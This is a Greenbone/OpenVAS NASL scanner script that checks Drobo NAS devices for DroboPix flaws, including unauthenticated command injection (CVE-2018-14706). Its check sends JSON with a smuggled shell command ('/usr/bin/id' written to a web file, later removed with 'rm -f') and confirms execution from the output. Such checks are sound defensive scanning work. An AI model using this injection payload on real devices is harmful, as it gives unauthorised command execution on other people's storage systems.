if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.142109" );
	script_version( "2021-08-27T12:01:24+0000" );
	script_tag( name: "last_modification", value: "2021-08-27 12:01:24 +0000 (Fri, 27 Aug 2021)" );
	script_tag( name: "creation_date", value: "2019-03-08 14:41:22 +0700 (Fri, 08 Mar 2019)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)" );
	script_cve_id( "CVE-2018-14702", "CVE-2018-14706", "CVE-2018-14707" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "Drobo NAS Multiple Vulnerabilities in DroboPix" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2019 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_drobo_nas_consolidation.sc" );
	script_mandatory_keys( "drobo/drobopix/detected" );
	script_tag( name: "summary", value: "Drobo NAS are prone to multiple vulnerabilities in DroboPix." );
	script_tag( name: "insight", value: "Drobo NAS are prone to multiple vulnerabilities in DroboPix:

  - Unauthenticated Access to device info via Drobo Pix API drobo.php (CVE-2018-14702)

  - Unauthenticated Command Injection in DroboPix (CVE-2018-14706)

  - Unauthenticated Arbitrary File Upload in DroboPix (CVE-2018-14707)" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response." );
	script_xref( name: "URL", value: "https://blog.securityevaluators.com/call-me-a-doctor-new-vulnerabilities-in-drobo5n2-4f1d885df7fc" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_kb_item( "drobo/drobopix/port" )){
	exit( 0 );
}
vt_strings = get_vt_strings();
file = vt_strings["default_rand"];
url = "/DroboPix/api/drobopix/demo";
data = "{\"enabled\":\"false" + "';/usr/bin/id > /mnt/DroboFS/Shares/DroboApps/DroboPix/www/" + file + " #\"}";
req = http_post( port: port, item: url, data: data );
res = http_keepalive_send_recv( port: port, data: req );
if(!IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
	exit( 0 );
}
test_url = "/DroboPix/" + file;
req = http_get( port: port, item: test_url );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(IsMatchRegexp( res, "uid=[0-9]+.*gid=[0-9]+" )){
	report = "It was possible to execute the \"id\" command.\n\nResult:\n\n" + res;
	security_message( port: port, data: report );
	data = "{\"enabled\":\"false" + "';/bin/rm -f /mnt/DroboFS/Shares/DroboApps/DroboPix/www/" + file + " #\"}";
	req = http_post( port: port, item: url, data: data );
	http_keepalive_send_recv( port: port, data: req );
	exit( 0 );
}
exit( 0 );

